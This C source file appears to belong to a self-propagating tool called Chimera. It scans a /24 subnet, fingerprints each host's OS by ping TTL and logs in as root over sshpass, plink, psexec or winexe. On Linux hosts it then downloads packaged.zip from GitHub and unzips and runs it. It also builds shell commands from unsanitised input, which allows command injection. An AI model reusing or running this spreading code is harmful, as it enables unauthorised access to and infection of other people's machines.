#include "net.h"

/**
 * Connects to a remote host and executes a command.
 *
 * @param host The hostname or IP address of the remote host.
 * @param username The username to use for the connection. (OPTIONAL)
 * @param password The password to use for the connection.
 * @param command The command to execute on the remote host.
 * @param remote_os The operating system of the remote host.
 */
int establish_connection(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os) {
    char command_string[MAX_COMMAND_SIZE];
    int ret;
    
    if(remote_os == LINUX) {
        #ifdef _WIN32
            ret = snprintf(command_string, sizeof(command_string), "echo y | %s -ssh %s -l %s -pw %s \"%s\"",
                PLINK_EXE_PATH, host, username, password, command);
        #else 
            ret = snprintf(command_string, sizeof(command_string), "%s -p \"%s\" ssh %s@%s \"%s\"",
                SSH_PASS_PATH, password, username, host, command);
            // printf("sshpass -p \"%s\" ssh %s@%s \"%s\"",
            //     password, username, host, command);
        #endif
        if (ret >= sizeof(command_string)) {
            fprintf(stderr, "Command string too long\n");
            return -1;
        }
    } 
    // Construct the command string for a Windows host
    else if (remote_os == WINDOWS) {
        #ifdef _WIN32
            // Construct the command string for a Windows host using psexec
            ret = snprintf(command_string, sizeof(command_string), "%s \\\\%s -i -u %s -p %s %s",
                PS_EXEC_PATH, host, username, password, command);
        #else
            // Construct the command string for a Windows host using winexe
            ret = snprintf(command_string, sizeof(command_string), "%s -U %s%%%s //%s \"%s\"",
                WIN_EXE_PATH, username, password, host, command);
        #endif
        if (ret >= sizeof(command_string)) {
            fprintf(stderr, "Command string too long\n");
            return -1;
        }
    } 
    // Handle invalid operating system values
    else {
        fprintf(stderr, "Invalid operating system\n");
        return -1;
    }

    // Open a pipe to execute the command string and read the output
    FILE* fp = POPEN(command_string, "r");
    if (fp == NULL) {
        perror("popen");
        return -1;
    }

    // Read the output of the command line by line and print it
    char line[MAX_COMMAND_SIZE];
    while (fgets(line, sizeof(line), fp) != NULL) {
        printf("%s", line);
    }

    // Close the pipe and check for errors
    if (PCLOSE(fp) == -1) {
        perror("pclose");
        return -1;
    }
    return 1;
}

void spread_linux(const char* host, const char* username, const char* password) {
    // Download the zip file from the URL
    const char* url = "https://github.com/M00NLIG7/Chimera/raw/master/packaged.zip";
    const char* filename = "packaged.zip";
    char command_string[MAX_COMMAND_SIZE];
    int ret;
    
    // "curl -o packaged.zip https://github.com/M00NLIG7/Chimera/raw/master/packaged.zip"
    
    ret = snprintf(command_string, sizeof(command_string), "wget %s",url);
    if (ret >= sizeof(command_string)) {
        fprintf(stderr, "Command string too long\n");
        return;
    }

    if (establish_connection(host, username, password, command_string, LINUX) < 0) {
        return;
    }

    // Unzip the file on the remote Linux machine
    ret = snprintf(command_string, sizeof(command_string), "unzip -o %s > /dev/null", filename);
    if (ret >= sizeof(command_string)) {
        fprintf(stderr, "Command string too long\n");
        return;
    }

    if (establish_connection(host, username, password, command_string, LINUX) < 0) {
        return;
    }

    // Run the command on the remote Linux machine
    ret = snprintf(command_string, sizeof(command_string), "cd Chimera && ./chimera");
    if (ret >= sizeof(command_string)) {
        fprintf(stderr, "Command string too long\n");
        return;
    }

    printf(command_string);
    if (establish_connection(host, username, password, command_string, LINUX) < 0) {
        return;
    }

    // Remove the zip file
    ret = snprintf(command_string, sizeof(command_string), "rm -f %s", filename);
    if (ret >= sizeof(command_string)) {
        fprintf(stderr, "Command string too long\n");
        return;
    }

    if (establish_connection(host, username, password, command_string, LINUX) > 0) {
        return;
    }
}

static void spread_windows(const char* host, const char* username, const char* password, const char* command) {
    // implementation for spreading to Windows host
}

static void spread_cisco(const char* host, const char* username, const char* password, const char* command) {
    // implementation for spreading to Windows host
}

/**
 * Connects to a remote host and executes a command.
 *
 * @param subnet The subnet of the remote hosts. i.e. 192.168.1
 * @param username The username to use for the connection.
 * @param password The password to use for the connection.
 * @param command The command to execute on the remote host.
 * @param remote_os The operating system of the remote host.
 */
void spread(const char* subnet, const char* password, const char* command) {
    char command_string[MAX_COMMAND_SIZE];
    int ret;
    enum os_type remote_os;
    char* username = NULL;

    for(int i=0; i<=255; i++) {
        char host[MAX_COMMAND_SIZE];
        ret = snprintf(host, sizeof(host), "%s.%d", subnet, i);
        if (ret >= sizeof(host)) {
            fprintf(stderr, "Host string too long\n");
            continue;
        }
        remote_os = get_os_type(host);
        if (remote_os == UNKNOWN) {
            continue;
        } else if (remote_os == LINUX) {
            // establish_connection(host, username, password, command);
            username = "root";
            spread_linux(host, username, password);

        } else if (remote_os == WINDOWS) {
            username = "root";
            spread_windows(host, username, password, command);

        } else {
            username = "cisco";
            spread_windows(host, username, password, command);

        }
    }
}



enum os_type get_os_type(const char *ip_address) {
    char command[MAX_BUF_SIZE];
    #if defined(_WIN32) || defined(_WIN64)
        snprintf(command, sizeof(command), "ping -n 1 %s", ip_address);
        const char* ttl_str = "TTL=";
    #elif defined(__linux__)
        snprintf(command, sizeof(command), "ping -c 1 %s", ip_address);
        const char* ttl_str = "ttl=";
    #else
        #error "Unsupported platform"
    #endif

    FILE *ping_output = popen(command, "r");
    if (ping_output == NULL) {
        perror("popen");
        return UNKNOWN;
    }

    char output_buf[MAX_BUF_SIZE];
    size_t bytes_read = fread(output_buf, 1, sizeof(output_buf), ping_output);
    pclose(ping_output);

    if (bytes_read == 0) {
        fprintf(stderr, "Failed to read ping output: %s\n", strerror(errno));
        return UNKNOWN;
    }

    int ttl = -1;

    char* ttl_start = strstr(output_buf, ttl_str);
    if (ttl_start != NULL) {
        // Extract TTL from the output buffer
        char *ttl_val_str = ttl_start + strlen(ttl_str);
        if (sscanf(ttl_val_str, "%d", &ttl) != 1) {
            fprintf(stderr, "Failed to parse TTL: %s\n", ttl_val_str);
            return UNKNOWN;
        }
    }

    switch (ttl) {
        case 64:
            return LINUX;
        case 128:
            return WINDOWS;
        case 255:
            return CISCO;
        default:
            return UNKNOWN;
    }
}
